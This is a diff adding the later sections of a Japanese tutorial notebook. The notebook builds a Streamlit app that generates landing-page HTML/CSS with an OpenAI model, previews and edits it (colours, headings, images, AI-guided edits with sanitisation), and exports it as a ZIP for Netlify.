++    "    except RateLimitError as e:\n",
++    "        st.error(\"レート上限/クォータに達しました。\"); st.exception(e)\n",
++    "    except APIStatusError as e:\n",
++    "        st.error(f\"APIステータスエラー: {e.status_code}\"); st.exception(e)\n",
++    "    except Exception as e:\n",
++    "        st.error(\"AI生成に失敗しました（インストール/キー/モデル権限をご確認ください）。\"); st.exception(e)\n",
++    "    else:\n",
++    "        html = f\"\"\"<!DOCTYPE html>\n",
++    "<html lang=\"ja\">\n",
++    "<head>\n",
++    "  <meta charset=\"utf-8\" />\n",
++    "  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n",
++    "  <title>{site_title} – Landing</title>\n",
++    "  <meta name=\"description\" content=\"{meta_desc}\">\n",
++    "  <link rel=\"stylesheet\" href=\"./styles.css\" />\n",
++    "</head>\n",
++    "<body>\n",
++    "{body}\n",
++    "</body>\n",
++    "</html>\"\"\"\n",
++    "\n",
++    "        st.session_state.gen_html  = html\n",
++    "        st.session_state.gen_css   = css\n",
++    "        st.session_state.img_slots = find_image_placeholders(body)\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "81c8e70a",
++   "metadata": {},
++   "source": [
++    "\n",
++    "## セクション8：プレビュー & エディタ\n",
++    "\n",
++    "生成した HTML/CSS を左でプレビュー、右で編集できる UI を作ります。  \n",
++    "次の4つの編集機能をまとめて提供します。\n",
++    "\n",
++    "1. **テーマ編集（:root 変数）**  \n",
++    "   - カラーや角丸を GUI（カラーピッカー／スライダー）で調整し、`replace_root_vars()` で反映\n",
++    "\n",
++    "2. **テキスト編集（H1 / サブ）**  \n",
++    "   - 見出しとサブコピーを `extract_*` / `replace_*` で安全に差し替え\n",
++    "\n",
++    "3. **画像差し替え**  \n",
++    "   - プレースホルダ `<div>` を `file_uploader` → `data_uri_from_file()` → `<img>` に置換\n",
++    "\n",
++    "4. **AI 差分編集**  \n",
++    "   - GPT に「配置変更・装飾変更」を指示し、JSON 形式 `{css, body_html}` で差し戻し  \n",
++    "   - `sanitize_html()` を通し、スクリプトや危険属性を除去\n",
++    "\n",
++    " 目的：**生成したLPを即プレビューしながら安全にカスタマイズ** できるようにする。\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 21,
++   "id": "474ca236",
++   "metadata": {},
++   "outputs": [
++    {
++     "name": "stderr",
++     "output_type": "stream",
++     "text": [
++      "2025-09-15 11:19:22.731 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
++     ]
++    }
++   ],
++   "source": [
++    "\n",
++    "if st.session_state.gen_html and st.session_state.gen_css:\n",
++    "    colA, colB = st.columns([7, 5])\n",
++    "\n",
++    "    # プレビュー\n",
++    "    with colA:\n",
++    "        st.subheader(\"🔎 プレビュー\")\n",
++    "        body_only = st.session_state.gen_html.split(\"<body>\", 1)[1]                                              .rsplit(\"</body>\", 1)[0]\n",
++    "        inline = f\"\"\"<!DOCTYPE html><html><head><meta charset='utf-8'>\n",
++    "<meta name='viewport' content='width=device-width, initial-scale=1'>\n",
++    "<style>{st.session_state.gen_css}</style></head><body>{body_only}</body></html>\"\"\"\n",
++    "        components.html(inline, height=960, scrolling=True)\n",
++    "\n",
++    "    with colB:\n",
++    "        st.subheader(\"🛠 エディタ\")\n",
++    "\n",
++    "        # :root 変数編集\n",
++    "        vars_now = extract_root_vars(st.session_state.gen_css)\n",
++    "        color_keys  = [k for k in vars_now if any(x in vars_now[k] for x in [\"#\", \"rgb\", \"hsl\"])]\n",
++    "        radius_keys = [k for k in vars_now if \"radius\" in k or k == \"--r\"]\n",
++    "\n",
++    "        with st.expander(\"🎨 カラー & トークン編集\", expanded=True):\n",
++    "            new_vars: Dict[str, str] = {}\n",
++    "            for k in color_keys:\n",
++    "                v = vars_now[k].strip()\n",
++    "                new_vars[k] = st.color_picker(k, v) if v.startswith(\"#\") and len(v) in (4, 7) else st.text_input(k, v)\n",
++    "            for k in radius_keys:\n",
++    "                m = re.search(r\"(\\d+)\", vars_now[k]); init = int(m.group(1)) if m else 12\n",
++    "                px = st.slider(f\"{k}（px）\", 0, 40, init); new_vars[k] = f\"{px}px\"\n",
++    "            if st.button(\"⬆ CSSに反映\"):\n",
++    "                st.session_state.gen_css = replace_root_vars(st.session_state.gen_css, new_vars)\n",
++    "                st.success(\"CSS（:root）を更新しました。\")\n",
++    "\n",
++    "        # テキスト編集\n",
++    "        with st.expander(\"✏️ テキスト編集（最初のH1 & サブ）\", expanded=False):\n",
++    "            curr_body = st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0]\n",
++    "            curr_h1  = extract_first_h1(curr_body)\n",
++    "            curr_sub = extract_subtext(curr_body)\n",
++    "            new_h1   = st.text_input(\"H1\", curr_h1 or site_title)\n",
++    "            new_sub  = st.text_input(\"サブ（.sub / .lead）\", curr_sub or tagline)\n",
++    "            if st.button(\"⬆ テキスト反映\"):\n",
++    "                body = curr_body\n",
++    "                if curr_h1:  body = replace_first_h1(body, new_h1)\n",
++    "                if curr_sub: body = replace_subtext(body, new_sub)\n",
++    "                st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, body)\n",
++    "                st.success(\"テキストを更新しました。\")\n",
++    "\n",
++    "        # 画像差し替え\n",
++    "        with st.expander(\"🖼 画像差し替え（プレースホルダ）\", expanded=False):\n",
++    "            curr_body = st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0]\n",
++    "            if not st.session_state.img_slots:\n",
++    "                st.info(\"プレースホルダ（aria-label=\\\"image\\\" または class=\\\"img ...\\\"）が見つかりません。\")\n",
++    "            else:\n",
++    "                updated = False\n",
++    "                for idx, (_, ph_html) in enumerate(st.session_state.img_slots):\n",
++    "                    up = st.file_uploader(f\"画像 {idx+1}\", type=[\"png\", \"jpg\", \"jpeg\", \"webp\"], key=f\"u_{idx}\")\n",
++    "                    if up is not None:\n",
++    "                        data_uri, _ = data_uri_from_file(up)\n",
++    "                        curr_body = replace_placeholder_with_img(curr_body, ph_html, data_uri)\n",
++    "                        updated = True\n",
++    "                if updated:\n",
++    "                    st.session_state.gen_html = st.session_state.gen_html.replace(\n",
++    "                        st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0],\n",
++    "                        curr_body\n",
++    "                    )\n",
++    "                    st.session_state.img_slots = find_image_placeholders(curr_body)\n",
++    "                    st.success(\"画像を反映しました。\")\n",
++    "\n",
++    "        # AI差分編集\n",
++    "        with st.expander(\"🤖 AIに指示して再編集（差分適用）\", expanded=False):\n",
++    "            st.write(\"例）『ヒーローを左右2カラムに』『可愛い方向に』『角丸20px』『余白を広め』『ネオン感強め』など\")\n",
++    "            ai_edit_prompt = st.text_area(\"AIへの指示（日本語でOK）\", height=90)\n",
++    "\n",
++    "            def ai_edit(css_text: str, body_html: str, instruction: str) -> Tuple[str, str]:\n",
++    "                if client is None:\n",
++    "                    raise RuntimeError(\"OpenAI クライアントが初期化されていません。APIキー設定を確認してください。\")\n",
++    "                sys = \"あなたはフロントエンド/デザインの専門家です。安全な純HTML+CSSのみで編集します。\"\n",
++    "                user = f\"\"\"\n",
++    "これから与える 'css' と 'body_html' を、指示に従って**直接書き換え**てください。\n",
++    "- 返答は JSON 1個、スキーマは {{ \"css\": \"...\", \"body_html\": \"...\" }} のみ\n",
++    "- scriptタグ・外部CDN・@import は禁止\n",
++    "- onClick 等の on* は使わない\n",
++    "- 画像は既存のダミーdiv/imgを整形（新規読み込み禁止）\n",
++    "\n",
++    "[現在のCSS]\n",
++    "{css_text}\n",
++    "\n",
++    "[現在のBODY]\n",
++    "{body_html}\n",
++    "\n",
++    "[編集指示]\n",
++    "{instruction}\n",
++    "\"\"\"\n",
++    "                resp = client.chat.completions.create(\n",
++    "                    model=\"gpt-4o-mini\",\n",
++    "                    temperature=0.8,\n",
++    "                    response_format={\"type\": \"json_object\"},\n",
++    "                    messages=[{\"role\": \"system\", \"content\": sys}, {\"role\": \"user\", \"content\": user}],\n",
++    "                )\n",
++    "                dat = json.loads(resp.choices[0].message.content)\n",
++    "                return dat.get(\"css\", \"\"), sanitize_html(dat.get(\"body_html\", \"\"))\n",
++    "\n",
++    "            if st.button(\"🪄 指示どおりAIで再編集する\"):\n",
++    "                try:\n",
++    "                    curr_body = st.session_state.gen_html.split(\"<body>\", 1)[1].rsplit(\"</body>\", 1)[0]\n",
++    "                    new_css, new_body = ai_edit(\n",
++    "                        st.session_state.gen_css,\n",
++    "                        curr_body,\n",
++    "                        ai_edit_prompt.strip() or \"全体を洗練。余白と階層のコントラストを調整。\"\n",
++    "                    )\n",
++    "                    if new_css:\n",
++    "                        st.session_state.gen_css = new_css\n",
++    "                    if new_body:\n",
++    "                        st.session_state.gen_html = st.session_state.gen_html.replace(curr_body, new_body)\n",
++    "                        st.session_state.img_slots = find_image_placeholders(new_body)\n",
++    "                    st.success(\"AI差分編集を反映しました。\")\n",
++    "                except Exception as e:\n",
++    "                    st.error(\"AI差分編集に失敗しました。\"); st.exception(e)\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "3adfa79b",
++   "metadata": {},
++   "source": [
++    "## セクション9：コード表示 & ダウンロード（ZIP化）\n",
++    "\n",
++    "生成した HTML/CSS を閲覧し、そのままダウンロードできる仕組み。\n",
++    "\n",
++    "1. **単体ダウンロード**\n",
++    "   - `st.tabs()` で「index.html」「styles.css」を表示\n",
++    "   - `st.download_button()` で個別にDL\n",
++    "\n",
++    "2. **ZIP一括ダウンロード**\n",
++    "   - `to_zip()` が HTML 内の `data:` 画像を抽出し、`assets/` に展開\n",
++    "   - `index.html` / `styles.css` / 画像をまとめて ZIP に格納\n",
++    "\n",
++    "目的：**LPをすぐに配布・デプロイできる形式に変換** する。\n"
++   ]
++  },
++  {
++   "cell_type": "code",
++   "execution_count": 22,
++   "id": "f584f33e",
++   "metadata": {},
++   "outputs": [
++    {
++     "name": "stderr",
++     "output_type": "stream",
++     "text": [
++      "2025-09-15 11:25:30.813 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:25:30.835 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:25:30.843 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n",
++      "2025-09-15 11:25:30.845 Thread 'MainThread': missing ScriptRunContext! This warning can be ignored when running in bare mode.\n"
++     ]
++    }
++   ],
++   "source": [
++    "\n",
++    "if st.session_state.gen_html and st.session_state.gen_css:\n",
++    "    st.subheader(\"🧩 生成コード / ダウンロード\")\n",
++    "    tabs = st.tabs([\"index.html\", \"styles.css\"])\n",
++    "\n",
++    "    with tabs[0]:\n",
++    "        st.code(st.session_state.gen_html, language=\"html\")\n",
++    "        st.download_button(\"index.html をDL\", st.session_state.gen_html.encode(\"utf-8\"), file_name=\"index.html\")\n",
++    "\n",
++    "    with tabs[1]:\n",
++    "        st.code(st.session_state.gen_css, language=\"css\")\n",
++    "        st.download_button(\"styles.css をDL\", st.session_state.gen_css.encode(\"utf-8\"), file_name=\"styles.css\")\n",
++    "\n",
++    "    def to_zip(html: str, css: str) -> bytes:\n",
++    "        buf = io.BytesIO()\n",
++    "        with zipfile.ZipFile(buf, \"w\", zipfile.ZIP_DEFLATED) as z:\n",
++    "            html_out = html\n",
++    "            matches = re.findall(r'src=\"data:[^\"]+\"', html_out)\n",
++    "            img_index = 1\n",
++    "            for m in matches:\n",
++    "                data_uri = m.split('\"', 1)[1].rsplit('\"', 1)[0]\n",
++    "                if \";base64,\" in data_uri:\n",
++    "                    parts = data_uri.split(\";base64,\", 1)\n",
++    "                    if len(parts) == 1:\n",
++    "                        parts = data_uri.split(\";base64;\", 1)\n",
++    "                    head, b64 = parts[0], parts[1]\n",
++    "                    if \"image/png\" in head: ext = \"png\"\n",
++    "                    elif \"image/webp\" in head: ext = \"webp\"\n",
++    "                    elif \"image/jpeg\" in head or \"image/jpg\" in head: ext = \"jpg\"\n",
++    "                    else: ext = \"png\"\n",
++    "                    data = base64.b64decode(b64)\n",
++    "                    path = f\"assets/img_{img_index}.{ext}\"\n",
++    "                    z.writestr(path, data)\n",
++    "                    html_out = html_out.replace(data_uri, \"./\" + path, 1)\n",
++    "                    img_index += 1\n",
++    "            z.writestr(\"index.html\", html_out)\n",
++    "            z.writestr(\"styles.css\", css)\n",
++    "            z.writestr(\"script.js\", \"\")\n",
++    "        buf.seek(0); return buf.getvalue()\n",
++    "\n",
++    "    st.download_button(\n",
++    "        \"📦 一括ZIP（Netlify用）\",\n",
++    "        to_zip(st.session_state.gen_html, st.session_state.gen_css),\n",
++    "        file_name=\"lp_site_ai_editable.zip\"\n",
++    "    )\n",
++    "else:\n",
++    "    st.info(\"左サイドバーを設定して［🎯 LPを生成（AI）］を押してください。生成後に右側で色/テキスト/画像/AI差分編集ができます。\")\n"
++   ]
++  },
++  {
++   "cell_type": "markdown",
++   "id": "8495b314",
++   "metadata": {},
++   "source": [
++    "## まとめ：学習チェックポイント\n",
++    "\n",
++    "- `st.set_page_config` と基本ウィジェットの使い方を説明できる  \n",
++    "- `st.session_state` を使って状態を保持する理由を説明できる  \n",
++    "- `components.html` で生成した HTML/CSS を安全にプレビューできる  \n",
++    "- `.env` と `st.secrets` の両方に対応した **APIキー取得パターン** を理解できる  \n",
++    "- `:root` の CSS トークン設計により「テーマを後から素早く変更」できることを説明できる\n",
++    "\n",
++    "> 次のステップ：`components.html` の応用、`st.cache_data` / `st.cache_resource` の使い分け、  \n",
++    "> multipage 構成（`pages/`）や `st.navigation` の検討などにも挑戦してみましょう。\n"
++   ]
++  }
++ ],
++ "metadata": {
++  "kernelspec": {
++   "display_name": "base",
++   "language": "python",
++   "name": "python3"
++  },
++  "language_info": {
++   "codemirror_mode": {
++    "name": "ipython",
++    "version": 3
++   },
++   "file_extension": ".py",
++   "mimetype": "text/x-python",
++   "name": "python",
++   "nbconvert_exporter": "python",
++   "pygments_lexer": "ipython3",
++   "version": "3.11.4"
++  }
++ },
++ "nbformat": 4,
++ "nbformat_minor": 5
++}
